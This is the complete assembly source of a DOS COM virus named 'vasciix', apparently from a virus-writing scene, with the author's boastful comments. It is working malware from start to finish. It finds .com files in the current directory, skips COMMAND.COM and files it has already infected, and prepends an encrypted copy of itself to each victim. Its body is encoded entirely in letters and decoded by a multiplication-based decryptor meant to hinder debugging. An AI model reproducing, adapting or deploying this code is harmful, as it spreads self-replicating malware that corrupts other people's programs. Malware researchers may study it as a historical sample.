
;=============================================================================
; vasciix
; - DOS COM non-resident prepender (stupid infection method)
; - infects files in current directory
; - infects files with size <=7000h
; - antidebug due to the realization of decryptor :)
; - compile with FASM 1.67 or later
; - only a-z, A-Z bytes are used in first generation (eeaaahhh!!!)
; - size: 554 byte (well, I bad optimized main body and method of prepending
;   makes virus to grow :))
; (x) Malum 2009
;---------------
;note: this virus is prepender due to the beauty of infected files only :)
; infected file looks like this:
;`aaaaaaaaaaa*&&&&&&&&&&&&&&&&&&&&
;where ` - code of CLI command (0fah)
;      a - a-z,A-Z bytes (virus code itself)
;      * - word (size of host '&&&&')
;      & - code of infected host file
;=============================================================================


BP_OFF = 6eh			;we will address code with [bp+di+off]
DI_OFF = 6dh
x      = (_x-(BP_OFF+DI_OFF))	;_x - mulencrypted main code decryptor address
				;x  - realitive _x address (_x = x+bp+di)

	org	100h

;=============================================================================
;mul-decryption of main code decryptor
;=============================================================================
start:
	db	64h		;fs: prefix (stub for cli in next generations)
	push	sp		;bx = old sp
	push	sp		;sp = old sp (to avoid crash)
	push	BP_OFF		;bp = new bp
	push	ax		;si = stub
	push	DI_OFF		;di = new di
	popa

	imul	ax, [bp+di+x+18], 4745h
	imul	cx, [bp+di+x+16], 44h
	imul	dx, [bp+di+x+14], 78h
	imul	si, [bp+di+x+12], 65h
	imul	sp, [bp+di+x+20], 54h	;now we can crash in first start
					;let's pray :)
	;any interrupt will corrupt code flow while we push'n'mul
	;only in first generation (with 64h instead of cli)
	push	ax			;f5eb
	push	cx			;aa10
	push	dx			;d508
	push	si			;7861 ~ :P
	imul	ax, [bp+di+x+10], 4dh
	imul	cx, [bp+di+x+08], 53h
	imul	dx, [bp+di+x+06], 47h
	imul	si, [bp+di+x+04], 57h
	push	ax			;612d
	push	cx			;adfe
	push	dx			;8b01
	push	si			;56be
	imul	ax, [bp+di+x+02], 4bh
	imul	cx, [bp+di+x+00], 41h
	push	ax			;fbfc
	push	cx			;dc89   now _x is mul-decrypted


;=============================================================================
;10 words of main code decryptor (mul-encrypted)
;very simple alogorithm of main code encoding: (byte XYh --> word 0X0Yh+'aa')
;not so simple algorithm of mul-decryption :)
;=============================================================================

;address here: 0140 (mul-encrypted main code decryptor)
_x:	dw 04a49h
	dw 04e74h
	dw 05072h
	dw 04677h
	dw 0524ah
	dw 05461h		
	dw 0524dh
	dw 04a4fh
	dw 04644h
	dw 0436fh		;<--SP mul-decrypts decryptor from here to up

	dw 04f41h		;word for SP setting

;       mov     sp, bx          ;89 dc
;       cld                     ;fc
;       sti                     ;fb
;       mov     si, encode      ;be 56 01
;       mov     di, si          ;8b fe
;dloop: lodsw                   ;ad
;       sub     ax, 'aa'        ;2d 61 61      'AA' end mark causes SF=1
;       js      exit0157        ;78 08     oops 157 - error in calculations :)
;       aad     10h             ;d5 10
;       stosb                   ;aa
;       jmp     dloop           ;eb f5    

;address here: 0156


;=============================================================================
;here main code comes
;we can place here any valid x86 code
;this is dirty COM virus prepender (unbeauty code)
;=============================================================================

muldec_size = _x-start
total_virus_size = muldec_size + 22 + ensize*2 + 4
ensize = (code_end-encode)
encode:
	nop				;this nop must be here (lil mistake ))  
	mov	di, 8000h		;8000h - our memory buffer
	mov	al, 0fah		;code of CLI command
	stosb				;write CLI instead of 64h first byte

	mov	cx, muldec_size-1	;copy mul-decryptor in memory
	mov	si, 101h
	rep movsb

	mov	si, _x_duplicate
	mov	cl, 11			;copy 11 words of mul-enc main decryptor
	rep movsw			;old words are lost here

	mov	si, encode
	mov	cx, ensize
vxt:
	lodsb
	aam	10h
	add	ax, 'aa'
	stosw				;byte XYh --> word 0X0Yh+'aa'
	loop	vxt			;encrypt itself

	mov	ax, 'AA'
	stosw				;write mark of end of encrypted data
	stosw				;write place for size of infected file

	mov	dx, code_end
	mov	ah, 1ah
	int	21h			;set new dta

	mov	cl, 7			;cx = 7 (all files)
	mov	dx, mask
	mov	ah, 4eh
search:
	int	21h			;find next/first
	jc	mmkey

	mov	dx, code_end+1eh	;asciiz file name from dta
	cmp	word [code_end+1eh+5], 'DN'	;to avoid COMMAND.COM
	je	noinf	

	mov	ax, 3d02h
	int	21h			;open r/w
	jc	noinf
	xchg	bx, ax			;file index
	xor	bp, bp			;isinfected mark

	xor	cx, cx
	xor	dx, dx
	mov	ax, 4202h
	int	21h			;lseek to end of file to get size
	
	cmp	ax, 7000h
	ja	novic			;too big victim >7000h
	mov	[di-2], ax		;write size of file

	mov	ax, 4200h
	int	21h			;lseek to begin of file

	mov	dx, di			;buffer
	mov	cx, [di-2]		;size of victim
	mov	ah, 3fh 		;read file
	int	21h			;append victim to virus

	cmp	word [di], 'ZM' 	;MZ under .com extension
	je	novic
	cmp	byte [di], 0fah 	;first CLI is infection mark
	je	novic

	add	cx, total_virus_size
	push	cx

	xor	cx, cx
	xor	dx, dx
	mov	ax, 4200h
	int	21h			;lseek to begin of file

	pop	cx
	mov	dx, 8000h
	mov	ah, 40h 		;write victim
	int	21h

	inc	bp			;is infected
novic:
	mov	ah, 3eh
	int	21h			;close file in BX
	test	bp, bp
	jnz	mmkey
noinf:
	mov	ah, 4fh
	jmp	search
mmkey:
	mov	dx, 80h
	mov	ah, 1ah
	int	21h			;reset default dta

	cmp	byte [100h], 64h	;exit if it is first generation
	je	0

	mov	si, loader
	mov	di, 0ff00h		;place for loader
	mov	cx, loader_size
	rep movsb
	jmp	0ff00h			;jmp to host loader

loader_size = loader_end-loader
loader:
	mov	si, victim-2
	lodsw				;get size of host
	xchg	cx, ax
	mov	di, 100h
	rep movsb			;move host on 100h address
	xor	sp, sp
	push	cx			;push 0
	push	100h
	ret
loader_end:
mask	db '*.com',0
_x_duplicate:
	dw 04a49h
	dw 04e74h
	dw 05072h
	dw 04677h
	dw 0524ah
	dw 05461h		
	dw 0524dh
	dw 04a4fh
	dw 04644h
	dw 0436fh
	dw 04f41h

code_end:

	db ensize dup(?)		;additional place for encrypted code
	db 'AA' 			;mark of end of encrypted data

	;dw 0xxxxh                      ;size of infected program body
	;...infected host program...    ;infected program in next generations

victim = code_end + ensize + 4


;=============================================================================
;compilation time encryption of code (byte XYh --> word 0X0Yh+'aa')
;=============================================================================

dptr = encode + ensize*2
while encode<dptr
  dptr = dptr-2
  load a byte from encode+(dptr-encode)/2
  xxx = ((((a and 0f0h) shl 4) + (a and 00fh)) + 'aa') and 0ffffh
  store word xxx at dptr
end while

